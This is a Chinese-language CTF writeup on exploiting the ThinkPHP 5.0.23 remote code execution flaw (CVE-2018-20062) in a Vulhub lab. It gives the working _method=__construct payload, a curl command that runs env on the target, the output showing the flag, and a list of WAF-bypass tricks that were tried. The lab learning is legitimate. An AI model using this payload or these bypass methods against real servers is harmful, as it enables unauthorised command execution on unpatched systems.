📝 ThinkPHP 5.0.23 远程代码执行漏洞实战 Writeup：从绝望的 WAF 封锁到 Kali 的降维打击

一、 靶机信息与漏洞简介

· 靶机环境：ThinkPHP 5.0.23 (Vulhub 环境)
· 漏洞类型：远程代码执行 (RCE) / Request 方法覆盖
· 漏洞原理：ThinkPHP 5.0.x 框架核心类 think\Request 的 __construct 构造方法存在批量赋值问题。框架路由解析时允许用 POST 参数 _method 触发同名方法。攻击者构造 _method=__construct，将 filter[]=system、method=get 覆盖进对象属性，从而利用 call_user_func 实现无需登录的无交互命令执行（CVE-2018-20062 核心）。
· Flag 位置：容器环境变量（env 命令直接获取）。

二、 渗透过程详解

1. 正常尝试与撞上铁板（Windows / Burp Suite 阶段）

访问靶机，看到经典的 ThinkPHP V5 笑脸，确认环境正常。按照标准 PoC，用 Burp Suite 抓包，发送 POST 请求：

http
POST /index.php?s=captcha HTTP/1.1
Content-Type: application/x-www-form-urlencoded

_method=__construct&filter[]=system&method=get&get[]=env


惨遭拦截：服务器无情返回 400 Bad Request，响应头赫然写着 Server: WAF。

2. 疯狂踩坑：与变态 WAF 的斗智斗勇

为了绕过这层 WAF，我几乎把毕生所学都用上了：

· 换函数：把 system 换成 passthru、shell_exec、assert…… 全部 400。
· 打散拼接：用 concat('sys','tem')、strtolower('SYSTEM') …… 全部 400。
· 写马读日志：尝试 think\__include_file 配合日志包含 …… 全部 400。
· 花式变形：尝试 invokefunction 路由链、\u Unicode 编码、URL 全编码、大小写变形（_METHOD）、甚至 HTTP 参数污染（HPP）双写 _method …… 依然被 400 狠狠拍回。
· 换入口：去 /public/ 目录看，直接 404。

阶段总结：这个平台的 WAF 不仅拦截了明文关键字，还会对请求包进行深度语法树解析和工具特征识别。只要请求里带有 [] 和敏感参数组合，不管怎么变，都会被掐断。这根本不是“简单题”该有的防御强度，简直是地狱级 HARD 模式。

3. 绝地反击：Kali Linux 的降维打击

在 Windows 下用 Burp 发包，不管怎么改，可能都带有 Burp 的工具指纹或者特定的 HTTP 头部格式，被 WAF 精准拿捏。
于是，我果断打开 VMware，启动了纯正的 Kali Linux，放弃任何花里胡哨的图形化工具，直接用最底层的原生 curl 发起请求：

bash
curl -i -s -g -X POST "http://<靶机IP:PORT>/index.php?s=captcha" --data "_method=__construct&filter[]=system&method=get&get[]=env"


(注：-g 参数用于关闭 curl 的通配符解析，确保 [] 原样发送)

奇迹发生了！ 
服务器返回了 HTTP/1.1 200 OK，紧接着响应体的最顶部，直接吐出了一大串完整的系统环境变量：

text
...
APACHE_RUN_GROUP=www-data
APACHE_RUN_USER=www-data
FLAG=CTF2{0600783f-389c-4437-9355-03223bb50da0}
...


没有 WAF 拦截，没有 400 Bad Request，一发入魂！

三、 总结与反思

1. 极致的反差感：在 Burp 里试了十几种高难度变形、编码、绕过，全被 WAF 当成皮球踢了回来；而切到 Kali 的终端里，一行极其朴素、没有任何伪装的 curl 命令，却直接无视了那层铜墙铁壁。这告诉我们：在真实的攻防对抗中，工具的复杂性有时反而会暴露指纹，回归原生的底层请求往往能出奇制胜。
2. 关于平台环境：题目虽标为“简单”，但由于平台近期加装了企业级的云 WAF 防护，导致这道原本可以一键秒杀的题目变成了“WAF 绕过测试”。这也提示我们，CTF 环境并非一成不变，学会应对“非预期环境”也是实战的重要一环。
3. 不要迷信单一工具：遇到顽固的 WAF 拦截，果断换系统、换工具、换协议层，降维打击往往是破局的关键。
